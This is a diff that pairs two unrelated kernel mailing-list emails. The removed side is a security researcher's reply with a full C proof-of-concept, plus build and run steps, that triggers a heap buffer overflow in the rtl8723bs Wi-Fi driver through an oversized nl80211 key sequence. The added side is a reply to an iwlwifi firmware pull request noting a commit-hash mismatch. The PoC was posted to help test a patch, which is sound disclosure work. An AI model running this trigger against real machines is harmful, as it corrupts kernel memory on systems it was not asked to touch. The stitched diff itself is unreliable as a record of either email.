@@ -1,60 +1,121 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.70.43.99
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=205.220.180.131
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793801103;
-	b=0m4ViUJ9FwJKnl60RjfuG4qYF36u6nYySKwNwXFip8g5iby9zeK0+Dg3MqIHdk8ZPKl/
-	 Lg9LzVvY6fGnGsE2dBKdpnf58hR6vnwyv3j4CVvDtRpYpJb8ewPOcq0k8/IJDv0tUdq0R
-	 9RubUKbbRtJM6JIeL0b8uZzLtohk9akt35fKViQ2PZndfRck6NwSwMX89Zk97nMcb0LP3
-	 PQYDOmex4zoa9/gBftKOiGbEiXSfnB92CF3S7TP91ojLIJF4VIYbnaBVqoRE8ylOvL3k/
-	 saeAuZmnaHrVI2tauxD362XklYWSkGDASL/OXN7S77iJxDNadGWvhsI0vbbrGi12iaQ==
+	t=1793801335;
+	b=n18t0fJ0ZbWaJRDGvvgQN9iqguxGZhde4ZUaHutamzHXQGEGmzOu4N3lBuUa+hEJk1No
+	 xQ4suGKYeA8NlCGqoyGrDWe3wRKVyEdVP9ao6YQGITVvzrT0Y5M9yWUHYTKgZhewmQAF0
+	 N78/dCVvrHqoKbEYR7isBpYZeszCJXUrC2sHivvHjFj4WiAc8NguZYHbxEm7LrIYAEU9R
+	 kOFBSogzpe0PmxjtB62PVoM2Cm+XlHXjKHf1+EabNVftMtK2aN3WZk6WTBWnS8+hBZDAo
+	 3d66K3OsKsI9iMJDuc+DoY/YbFEVhRCB8JHt8SLZBIlv2DhglNDnW/qTW0YIfukdcJw==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793801103;
-	h=DMARC-Filter:DKIM-Signature:Date:To:From:Cc:Subject:Message-ID:
-	 In-Reply-To:References:Feedback-ID:X-Pm-Message-ID:MIME-Version:
-	 Content-Type:Content-Transfer-Encoding;
-	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
-	b=WajfWK9ltp0HciTlhJ+fqcrQBZC3Kmz80IMOj9WgPYQQfMX+EW8umJ1C+AjY/3yK3rGA
-	 InRw2m6SMwk8keHtSdN4cad91FaMoxYSBvqFvI4PP/ISS7nrp0dM1HLyExvgKzPDdnmVN
-	 u4iQiQCDdCHSs1MQE738j9sTjHTNPlMoZ6Uklx/2Ak2rBZLqRkWJzMQBcJsXnltLLxW48
-	 kH6n5FuDiiEyVsQso7jZ5VgR2c/KElx4O0GT+9qEuOX2tVL85oI2AlT3aWi2t2wzDrn1O
-	 4H7UK5x+2mfWMSKHNsuFHglBdD/IufsrrwRMTdtHblnw2SJvdtfQ7I3LgQmUUG9Kr7g==
+	a=rsa-sha256; c=relaxed/relaxed; t=1793801335;
+	h=DMARC-Filter:Received:DKIM-Signature:Received:Received:
+	 DKIM-Signature:X-Google-DKIM-Signature:X-Forwarded-Encrypted:
+	 X-Gm-Message-State:X-Gm-Gg:X-Received:X-Received:Received:Date:From:
+	 To:Cc:Subject:Message-ID:References:MIME-Version:Content-Type:
+	 Content-Disposition:In-Reply-To:X-Proofpoint-GUID:
+	 X-Proofpoint-ORIG-GUID:X-Proofpoint-Spam-Details-Enc:
+	 X-Proofpoint-Spam-Info:X-Authority-Analysis:
+	 X-Proofpoint-Virus-Version:X-Proofpoint-Spam-Details;
+	bh=i+X/nIg7Kl1NLT3cyQDdj+/n6Eh9J2E9gTlg4zspLoY=;
+	b=KIYNrZO80NFOtQ2BgpoK6hbv2oG35SHMzOjS6yOGLy1pkdiI0BtsSvDZcmG+ojWYmJAe
+	 khhObJ9w0HsPNY1LLumqWEnPhgiUD1omkvkpW910087XAWC5d38a0v3x4Z7Fl6UzAFHLz
+	 tMpVEjK6H0mm9lv8VYy6beWUuacihkKD6j97k0HcCAswxfDogyHxLekMGkK2chLnKMEdv
+	 x0qrXI3FSpQxwRPsyJZkQDJQPcDKpjRu59X9LmwP2rNY3e2dt+9nvYbBfcxXB4gKMRA8Z
+	 qkqIyHeZlXniqLTDRgg3awdJBYal/DLXczQy2S7FMjHJ8tIJplJGonNUgyQDkiXUkBQ==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=innora.ai;
-	spf=pass smtp.mailfrom=innora.ai;
-	dkim=pass header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1;
-	arc=none smtp.remote-ip=185.70.43.99
-Received: from mail-4399.protonmail.ch (mail-4399.protonmail.ch [185.70.43.99])
+	dmarc=pass header.from=oss.qualcomm.com;
+	spf=pass smtp.mailfrom=oss.qualcomm.com;
+	dkim=pass header.d=qualcomm.com header.i=@qualcomm.com header.a=rsa-sha256 header.s=qcppdkim1 header.b=VdQXrOEe;
+	dkim=pass header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.a=rsa-sha256 header.s=google header.b=fUvF2lwj;
+	arc=none smtp.remote-ip=205.220.180.131
+Received: from mx0b-0031df01.pphosted.com (mx0b-0031df01.pphosted.com [205.220.180.131])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8CC51606A333;
-	Wed,  4 Nov 2026 14:04:59 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8CC51606A333
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=innora.ai
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AF56B606A33D
+	for <linux-wireless@vger.kernel.org>; Wed,  4 Nov 2026 14:08:54 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org AF56B606A33D
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=oss.qualcomm.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=innora.ai;
-	s=protonmail3; t=1793801096; x=1794060296;
-	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
-	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
-	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
-	 Message-ID:BIMI-Selector;
-	b=ZUE8W9w1ZW0t76mfKHFrM6uwG6egPoDuPvHiV5Tf1+qTy4slP24Dlww+EQnrK0E+1
-	 GaMUZ1N0C8n9pMazgN7HLXk1H8hpOUI//CTatvFesy+W1cTp5gS60uoUKqL4FphTB6
-	 x/hodMv8V4JcLMsY6V+MSZsrnsgg3KqrT41KCjtwbk1axUTux8Ucre/4vgFbN0vMCT
-	 gBUgmNbCidITKDgaCyA7/F8cdjcVjRiUYYwQ0uIYsjb51pSNCLcfC7ANDQzme48sIe
-	 NFNvap26A7G8h+fy+OjTiaaqc+9f/d3/s57hae8+VnHv22DLaG3uyGd6tjgKh4paR6
-	 l6dlRmBGySvlA==
-Date: Wed, 04 Nov 2026 14:04:50 +0000
-To: gregkh@linuxfoundation.org
-From: Feng Ning <feng@innora.ai>
-Cc: linux-staging@lists.linux.dev, linux-wireless@vger.kernel.org, luka.gejak@linux.dev, linux-kernel@vger.kernel.org, stable@vger.kernel.org, Feng Ning <feng@innora.ai>
-Subject: Re: [RFC PATCH v7] staging: rtl8723bs: fix heap buffer overflow in cfg80211_rtw_add_key()
-Message-ID: <20261104220434.677da673-2-feng@innora.ai>
-In-Reply-To: <20261104220347.ccc09fa4-1-feng@innora.ai>
-References: <20260413113224.5201-1-feng@innora.ai> <2026042626-tabloid-suitor-33c5@gregkh> <20260427111738.33069-1-feng@innora.ai> <2026050417-monkhood-backless-4c3e@gregkh> <20260504154823.52057-1-feng@innora.ai> <2026050458-numbness-haven-1ae4@gregkh> <20261104220347.ccc09fa4-1-feng@innora.ai>
-Feedback-ID: 140578448:user:proton
-X-Pm-Message-ID: 4cf252529bc12bbb696741956dbf03401e3d81c8
+	dkim=pass (2048-bit key, unprotected) header.d=qualcomm.com header.i=@qualcomm.com header.a=rsa-sha256 header.s=qcppdkim1 header.b=VdQXrOEe;
+	dkim=pass (2048-bit key, unprotected) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.a=rsa-sha256 header.s=google header.b=fUvF2lwj
+Received: from pps.filterd (m0279871.ppops.net [127.0.0.1])
+	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 6A4Ba56u2310421
+	for <linux-wireless@vger.kernel.org>; Wed, 4 Nov 2026 14:08:53 GMT
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
+	cc:content-type:date:from:in-reply-to:message-id:mime-version
+	:references:subject:to; s=qcppdkim1; bh=i+X/nIg7Kl1NLT3cyQDdj+/n
+	6Eh9J2E9gTlg4zspLoY=; b=VdQXrOEewZVdCoYa/Al0u6Q7FBGMKILB78CII0mt
+	AD6u0ddjAVUbTfThKihS5w5rS6ycNjNwnvMHyF3G9Paad0/0Eoo2KE4SvK4I5i7Y
+	4aBtIHSe/9J0vdzkclBF4/U2xXLRIXEdtnkTYXMHIduqJ88+ImXVQXH05WnNE4Mr
+	2YMmATZinKEgANyPMoIC2KwfHmu3HRZNxso6jXuCg9tHBwWo2rmVkaLZOnYZfbif
+	xYp3/9mV75SfdE3nVUfxYLQkPe4eqnK4FvA7z0gmpFOI2oalHxQZFr+9qorQLwY+
+	+E19xRnoeGSrSdaQxp+G9hqabUUBriS+rUoUc9BmYPTeng==
+Received: from mail-vk1-f199.google.com (mail-vk1-f199.google.com [209.85.221.199])
+	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4hqn8mv6k3-1
+	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
+	for <linux-wireless@vger.kernel.org>; Wed, 04 Nov 2026 14:08:53 +0000 (GMT)
+Received: by mail-vk1-f199.google.com with SMTP id 71dfb90a1353d-5c83124d530so578446e0c.2
+        for <linux-wireless@vger.kernel.org>; Wed, 04 Nov 2026 06:08:53 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=oss.qualcomm.com; s=google; t=1793801333; x=1794406133; darn=vger.kernel.org;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=i+X/nIg7Kl1NLT3cyQDdj+/n6Eh9J2E9gTlg4zspLoY=;
+        b=fUvF2lwjy3U89hxABWmTHfDhTIjUHSgF0XwjScU4TV0H6Jjus0kGrez/axp0GJVC6q
+         6Ic95ELprTWdtlCadGZxHPDDV+9SoGrrOFSFHzcldH9j+qw67G8dwe0xtmx5mi9z9Vwq
+         lb+SI7UTFhEHCmxHawV3Yvw0D/3t1Z3MC0HxyeGgaTpZcs198PFp3VueLdkI9E2RCK6j
+         5yIalA/7xzi5E4cHz2QvqGR0IPkeO+SqDfC7kOwXlAT2pGneTpOtiy2q+Y6pL5Wlt0He
+         KvbnRWZ890aF+r8SBm7iLcNrt0oeuotAbDGGWXOdtqo8QxLac1kzRVqqgzCCY6A0Zqzc
+         qrpw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1793801333; x=1794406133;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:message-id:subject:cc:to:from:date:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=i+X/nIg7Kl1NLT3cyQDdj+/n6Eh9J2E9gTlg4zspLoY=;
+        b=CWKPAEhcJox+GlDyW5OmdRXtEh6uDnQsK+kiJ+3ZeMkdtw7tJODs44/i8jGjWyAabo
+         tU5CyhI0l9muNMdgUPWmvmJh5qxwLRlyinZQiEJ18PIcWVlSU+TJ+IiQRlk086BgHUYZ
+         dlPubLZlShgxkxaU0J2hoaYSGZGM8jjKhYbcWmIttGIDAa+lD7MV2nb6luU7JaxHg2iW
+         EcxS39He/xbzc3gIi4S6damYlbtsykZONZI7IVcQiM0urcuSRNJ9icDWLclUjhTK+TU5
+         +/Pbp+NYIMUbtXKGYDYHC5z9QE9vyZDc7k2CHWrgy+ufYmrQSDz9b0BYghni4R6qBYJD
+         nC6Q==
+X-Forwarded-Encrypted: i=1; AKwUvBxToQGTQq6HKoz9eYV+6G6r7zjvgPCAOv4pyEMaW8RrFMCnuzghUKUcfihAJJHQq5ko/YgrGijKRcpVS6STAw==@vger.kernel.org
+X-Gm-Message-State: APuU4Z9HYRFTmKjbWFenA8UBmTuMPHZ9GrnZbJHjV0Fwem9hLFnL1uPZ
+	YK8Tz+qzAf+7wYaNPjpYcYCQPLoZ6rUkExHjMcshikiJErSS+ksMFKRII1bGt7uElwYWQlRnjtO
+	1Os/hiJPMVRSr00o/CM40PhZuPYQbIu4IKRJlfvs5smpYnQwlyimbyDV8qLbBHCk4Nkd6Sw==
+X-Gm-Gg: AYBFou1ZsVOxgkTi7/U1ZotQL2U+9VBFJ2gBDoJrIE1BMijtDUNtHmuOp9MEG2DE41j
+	RGD1tL5b39umsc47QgHwSYPGtFfgpaJrwbQMUqzZIAnEYYcMn8ai3sxrrUWkvSy0YyE8rWDk6eG
+	gVxlYU8ubnDuY6x45Zl/4nXyhMu7+bunqDuRsgkhj6MX0RlDWQM18QM3NmVeHw9sFbuHSZPykbd
+	+dE0FwQ5/7gBKG0n4DCnbWUK42lANgsW7ENXnyPstyIdkXAdKguZIxpiFuJ/8QiKOVxU/3iozZg
+	Ut9dNylfM3WPhuDvzG2z/oL1dXXwDAQwYE4dumU+XbNGF0RjtBOWZbbbXIf2M5AjVFb/m6T5Pzl
+	jnFZEDK9SToG+6v726ElWSrJHJEMRT5g88fG/Q1/VZc/26aI9tYfAkLlxsh8e5InKkHkDhdPaiL
+	PLXeeQa+1T+s/K1ZxywVX0avDgqdmYdG3gP0MUjfS1jFhHX6rqxsswLtMFgx/R
+X-Received: by 2002:a05:6122:1d4d:b0:5e5:1be6:e12c with SMTP id 71dfb90a1353d-5ec68997250mr7860217e0c.21.1793801332834;
+        Wed, 04 Nov 2026 06:08:52 -0800 (PST)
+X-Received: by 2002:a05:6122:1d4d:b0:5e5:1be6:e12c with SMTP id 71dfb90a1353d-5ec68997250mr7860169e0c.21.1793801332221;
+        Wed, 04 Nov 2026 06:08:52 -0800 (PST)
+Received: from umbar.lan (2001-14ba-a073-af00-264b-feff-fe8b-be8a.rev.dnainternet.fi. [2001:14ba:a073:af00:264b:feff:fe8b:be8a])
+        by smtp.gmail.com with ESMTPSA id 2adb3069b0e04-5bff38cf643sm390539e87.70.2026.11.04.06.08.51
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 04 Nov 2026 06:08:51 -0800 (PST)
+Date: Wed, 4 Nov 2026 16:08:49 +0200
+From: Dmitry Baryshkov <dmitry.baryshkov@oss.qualcomm.com>
+To: "Korenblit, Miriam Rachel" <miriam.rachel.korenblit@intel.com>
+Cc: Josh Boyer <jwboyer@kernel.org>,
+        "linux-firmware@kernel.org" <linux-firmware@kernel.org>,
+        "Dreyfuss, Haim" <haim.dreyfuss@intel.com>,
+        Linux Wireless <linux-wireless@vger.kernel.org>,
+        "Yang, You-Sheng" <vicamo.yang@canonical.com>,
+        "Hutchings, Ben" <ben@decadent.org.uk>,
+        "kyle@infradead.org" <kyle@infradead.org>,
+        "Damary, Guy" <guy.damary@intel.com>
+Subject: Re: pull request: iwlwifi firmware update 2026-11-04
+Message-ID: <mv4f6j2pmxcdbj2ranjmhgogb7pou2qny6phqg444l455bvmq2@ijma66dusr6r>
+References: <IA3PR11MB72131346BF3C1FC358A2344FDAA3682@IA3PR11MB721313.namprd11.prod.outlook.com>
 X-Mailing-List: linux-wireless@vger.kernel.org
 List-Id: <linux-wireless.vger.kernel.org>
 List-Post: <mailto:linux-wireless@vger.kernel.org>
@@ -64,173 +125,81 @@ List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-wireless+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <IA3PR11MB72131346BF3C1FC358A2344FDAA3682@IA3PR11MB721313.namprd11.prod.outlook.com>
+X-Proofpoint-GUID: SKxSpgtdnxyt255WxvO3ZuYadJjb-DDl
+X-Proofpoint-ORIG-GUID: SKxSpgtdnxyt255WxvO3ZuYadJjb-DDl
+X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYxMTA0MDA1NiBTYWx0ZWRfX7p18uGC7E6wy
+ tQM1F4nlqcxbCggKCiOH3SfGa0LI/VnL4/VE9h73z7Xg0+7nrc6tW31htOCFp798Bffi1QZPTlQ
+ Sr5skmDvgysVl46V+oCTfMgDaLFMn87YUiGBNGNw92r9hc47shr+SulIY72tG7hLcoscy2ylFWE
+ TKY4+dTxMvwA1pK3hAInsIF1FL4uR4TCI9mBuiV03+jt2VkXs3ZKV/9a7Cyd6c6dTqMN4blmhyp
+ 1FIX4l5gv8v6qadidNN21KHrCf2IQJYQMqAQaLvMtCtwlNkOCJ6gjJgil0a+DJiqNgPhfDWTgsx
+ 7YJ+ReT7aAsjfNX40cWcartOd97PoPbfHfF0WXzW8clV3i6Dsq1lv31fRt61MnKNPdVAn9XIt7i
+ 0Xanx7Z44wlvwwE6/xWawC13wp4A/k7XhoUI61ciF93ReB7OkWtJt4fRjgXNCNPUr21RBFaHm+w
+ PD6VjRiqdU32TJLeibA==
+X-Proofpoint-Spam-Info: AW1haW4tMjYxMTA0MDA1NiBTYWx0ZWRfX6Zaev+pl+pP9
+ enYLsA4UlPgxuXK/aNsE2weO2k8NFtLL95qMyyATv23vTFEwW77sDVJbNXQs3Qts5cu7vMFDfcK
+ anOywBtI0ERFT2Z93fZG6STdIt1MtBM=
+X-Authority-Analysis: v=2.4 cv=HbWB3SE8 c=1 sm=1 tr=0 ts=6aeb3c75 cx=c_pps
+ a=+D9SDfe9YZWTjADjLiQY5g==:117 a=xqWC_Br6kY4A:10 a=kj9zAlcOel0A:10
+ a=zJRp6_cAMcgA:10 a=s4-Qcg_JpJYA:10 a=VkNPw1HP01LnGYTKEx00:22
+ a=u7WPNUs3qKkmUXheDGA7:22 a=3WHJM1ZQz_JShphwDgj5:22 a=VwQbUJbxAAAA:8
+ a=dKIYUFIQmK5j6gWxYHwA:9 a=CjuIK1q_8ugA:10 a=vmgOmaN-Xu0dpDh8OwbV:22
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.293,Aquarius:18.0.1176,Hydra:6.1.138,FMLib:17.12.100.49
+ definitions=2026-11-04_04,2026-11-03_04,2025-10-01_01
+X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
+ impostorscore=0 priorityscore=1501 adultscore=0 malwarescore=0 suspectscore=0
+ clxscore=1015 spamscore=0 phishscore=0 lowpriorityscore=0 bulkscore=0
+ classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
+ reason=mlx scancount=1 engine=8.22.0-2610300000 definitions=main-2611040056
 
-As mentioned in the RFC, here is the userspace trigger for the
-overflow, for anyone with rtl8723bs hardware willing to test.
+On Wed, Nov 04, 2026 at 07:32:41AM +0000, Korenblit, Miriam Rachel wrote:
+> Hi,
+> 
+> This contains a firmwares for SC/SC2 with WH.
+> 
+> Please pull or let me know if there are any issues.
+> 
+> Thanks,
+> Miri
+> ---
+> 
+> The following changes since commit 02665d2016e1360cd2135998f36cfa303b5be6e1:
+> 
+>   Merge branch 'main' into 'main' (2026-11-03 05:36:41 +0000)
+> 
+> are available in the Git repository at:
+> 
+>   http://git.kernel.org/pub/scm/linux/kernel/git/iwlwifi/linux-firmware.git tags/iwlwifi-fw-2026-11-04
+> 
+> for you to fetch changes up to 831eb265ef66d3c94f021596b50e832b69b6023c:
 
-It sends NL80211_CMD_NEW_KEY with a 16-byte NL80211_ATTR_KEY_SEQ
-(8 bytes more than ieee_param.crypt.seq holds) on a monitor-less
-managed interface.  On an unpatched kernel with KASAN enabled it
-should produce:
+lfapply.sh: error: fetched 0f9f4ad5561de009b9656179c11601c3c01230c7 but
+the mail asks for 831eb265ef66d3c94f021596b50e832b69b6023c
 
-  BUG: KASAN: slab-out-of-bounds in cfg80211_rtw_add_key
-  Write of size 16 ...
 
-On a kernel with the v7 patch applied, the same command should
-return NLMSG_ERROR with errno EINVAL and no splat.
+> 
+>   iwlwifi: add Sc2/Wh FW for core24.70-99 release (2026-11-04 09:27:51 +0200)
+> 
+> ----------------------------------------------------------------
+> iwlwifi-fw: 2026-11-04
+> 
+> ----------------------------------------------------------------
+> Miri Korenblit (3):
+>       iwlwifi: update Sc/Wh FW for core102
+>       iwlwifi: add Sc2/Wh FW for core24.80-41 release
+>       iwlwifi: add Sc2/Wh FW for core24.70-99 release
+> 
+>  WHENCE                                        |  10 +++++++++-
+>  intel/iwlwifi/iwlwifi-sc-a0-wh-b0-c102.ucode  | Bin 2214468 -> 2214476 bytes
+>  intel/iwlwifi/iwlwifi-sc2-a0-wh-b0-c107.ucode | Bin 0 -> 2268248 bytes
+>  intel/iwlwifi/iwlwifi-sc2-a0-wh-b0-c108.ucode | Bin 0 -> 2280432 bytes
+>  4 files changed, 9 insertions(+), 1 deletion(-)
+>  create mode 100644 intel/iwlwifi/iwlwifi-sc2-a0-wh-b0-c107.ucode
+>  create mode 100644 intel/iwlwifi/iwlwifi-sc2-a0-wh-b0-c108.ucode
 
-Build (needs libnl-3.0 / libnl-genl-3.0):
-
-  gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs libnl-3.0 libn=
-l-genl-3.0)
-
-Run:
-
-  sudo ./poc wlan0
-
-Requires CAP_NET_ADMIN and an rtl8723bs interface present.
-
---- poc_seq_overflow.c ---
-
-/*
- * PoC: rtl8723bs cfg80211_rtw_add_key seq[] heap buffer overflow
- *
- * Bug:  drivers/staging/rtl8723bs/os_dep/ioctl_cfg80211.c ~line 887
- *       memcpy(param->u.crypt.seq, params->seq, params->seq_len);
- *
- *       param->u.crypt.seq =3D u8 seq[8]  (fixed 8 bytes, ieee80211.h:190)
- *       params->seq_len    =3D up to 16   (NL80211_KEY_SEQ .len=3D16, nl80=
-211.c:956)
- *       Result: 8-byte heap overflow WRITE past seq[8]
- *
- * Overwritten fields (struct ieee_param.u.crypt):
- *       offset 37: seq[8]    =E2=86=90 8 bytes written legitimately
- *       offset 45: pad       =E2=86=90 1 byte overflow
- *       offset 46: key_len   =E2=86=90 2 bytes overflow (u16, corrupted)
- *       offset 48: key[]     =E2=86=90 5 bytes overflow
- *
- * Trigger: NL80211_CMD_NEW_KEY with 16-byte NL80211_ATTR_KEY_SEQ
- * Requires: CAP_NET_ADMIN + rtl8723bs WiFi interface loaded
- * Build:    gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs lib=
-nl-3.0 libnl-genl-3.0)
- * Run:      sudo ./poc wlan0
- * Expect:   dmesg =E2=86=92 KASAN: slab-out-of-bounds WRITE in cfg80211_rt=
-w_add_key
- *
- * CWE-122 | CVSS 6.7 (AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
- *
- * Author: Feng Ning (feng@innora.ai) =E2=80=94 Innora Security Research
- */
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <net/if.h>
-#include <netlink/genl/genl.h>
-#include <netlink/genl/ctrl.h>
-
-/* nl80211 command and attribute IDs */
-#define NL80211_CMD_NEW_KEY       13
-#define NL80211_ATTR_IFINDEX       3
-#define NL80211_ATTR_KEY_DATA     25
-#define NL80211_ATTR_KEY_IDX      26
-#define NL80211_ATTR_KEY_CIPHER   27
-#define NL80211_ATTR_KEY_SEQ      28
-#define WLAN_CIPHER_SUITE_TKIP    0x000FAC02
-
-int main(int argc, char **argv)
-{
-    struct nl_sock *sk;
-    struct nl_msg *msg;
-    int fam, ifidx, ret;
-
-    if (argc < 2) {
-        fprintf(stderr, "Usage: sudo %s <wlan_interface>\n", argv[0]);
-        fprintf(stderr, "  Requires rtl8723bs driver and CAP_NET_ADMIN\n");
-        return 1;
-    }
-
-    ifidx =3D if_nametoindex(argv[1]);
-    if (!ifidx) {
-        perror("if_nametoindex");
-        return 1;
-    }
-
-    sk =3D nl_socket_alloc();
-    if (!sk) { perror("nl_socket_alloc"); return 1; }
-
-    if (genl_connect(sk) < 0) {
-        fprintf(stderr, "genl_connect failed\n");
-        return 1;
-    }
-
-    fam =3D genl_ctrl_resolve(sk, "nl80211");
-    if (fam < 0) {
-        fprintf(stderr, "nl80211 family not found\n");
-        return 1;
-    }
-
-    msg =3D nlmsg_alloc();
-    genlmsg_put(msg, 0, 0, fam, 0, 0, NL80211_CMD_NEW_KEY, 0);
-
-    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifidx);
-    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, 0);
-    nla_put_u32(msg, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_TKIP);
-
-    /* TKIP requires 32-byte key */
-    uint8_t key[32];
-    memset(key, 0x41, sizeof(key));
-    nla_put(msg, NL80211_ATTR_KEY_DATA, sizeof(key), key);
-
-    /*
-     * OVERFLOW TRIGGER
-     *
-     * NL80211_ATTR_KEY_SEQ with 16 bytes.  nl80211.c allows up to 16.
-     * cfg80211 passes this to driver as params->seq / params->seq_len=3D16=
-.
-     * rtl8723bs copies all 16 bytes into seq[8] =E2=86=92 8 bytes past bou=
-ndary.
-     *
-     * The overflow pattern 0x42 ('B') will be visible in KASAN output
-     * and in the corrupted key_len / key[] fields.
-     */
-    uint8_t seq[16];
-    memset(seq, 0x42, sizeof(seq));
-    nla_put(msg, NL80211_ATTR_KEY_SEQ, sizeof(seq), seq);
-
-    printf("[*] rtl8723bs seq[] heap overflow PoC\n");
-    printf("[*] Interface: %s (ifindex %d)\n", argv[1], ifidx);
-    printf("[*] Sending NL80211_CMD_NEW_KEY with seq_len=3D16 (buffer=3D8)\=
-n");
-
-    ret =3D nl_send_auto(sk, msg);
-    if (ret < 0)
-        fprintf(stderr, "[-] send failed: %s\n", nl_geterror(ret));
-    else
-        printf("[+] Sent %d bytes\n", ret);
-
-    /* Receive response (will likely be -ENOLINK or similar, but overflow
-     * already happened in the driver before the error path) */
-    nl_recvmsgs_default(sk);
-
-    nlmsg_free(msg);
-    nl_socket_free(sk);
-
-    printf("[*] Done. Check 'dmesg | grep KASAN' for heap overflow report.\=
-n");
-    return 0;
-}
-
---- end ---
-
-I have verified the trigger path by code review of the cfg80211 key
-installation path (nl80211 NL80211_KEY_SEQ policy allows .len =3D 16
-while the driver buffer is 8 bytes) but do not have the hardware to
-run it myself; that is exactly what a Tested-by from this list would
-add.
-
-Thanks,
-Feng Ning
-
+-- 
+With best wishes
+Dmitry
